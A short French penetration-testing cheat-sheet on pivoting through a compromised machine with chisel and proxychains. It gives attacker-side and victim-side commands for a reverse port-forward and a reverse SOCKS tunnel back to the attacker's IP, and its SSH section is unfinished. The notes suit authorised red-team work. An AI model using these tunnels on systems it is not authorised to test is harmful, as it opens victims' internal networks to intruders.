# Proxychain

> Pivoter dans le réseau via la machine hôte.
>
> Permet de faciliter les tests (e.g. accès à l'interface graphique pour un service web) et de donner accès à ses propres outils (si pas présent sur la cible par exemple).



### 1. Chisel

- **Port forwarding (accéder à un service ne tournant qu'en local sur une machine cible) avec l'exécutable [chisel][1]**:

  - Hôte :

    ```bash
    $ ./chisel server -p 9999 --reverse [open]
    ```

  - Cible :

    ```bash
    $ ./chisel client [IP_HOTE]:9999 R:127.0.0.1:9998:[IP_A_RENDRE_ACCESSIBLE]:[PORT_A_RENDRE_ACCESSIBLE]
    ```

    Explication  :

    - Le serveur (*machine de l'attaquant*) ouvre un port 
    - Le client (*machine victime*) s'y connecte
    - Le client créer une règle de port forwarding vers l'ip remote (ici, il dit au serveur qu'il est possible d'accéder à remote_ip:remote_port en requêtant sur 127.0.0.1:9998)

- **Proxy socks pour accéder à au réseau de la machine cible et à l'ensemble de ses ports notamment** (on prend la place de la machine) :

  - Hôte :

    ```bash
    $ ./chisel server -p 8000 --reverse
    ```

  - Cible :

    ```powershell
    .\chisel.exe client <IP_HOTE>:8000 R:1080:socks
    ```

  - Hôte :

    ```bash
    # Mettre la ligne suivante à la fin du fichier /etc/proxychains4
    # socks5  127.0.0.1 1080
    $ proxychains <COMMAND>
    ```

### 2. SSH

**TODO**



## References

[1]: https://www.youtube.com/watch?v=Yp4oxoQIBAM
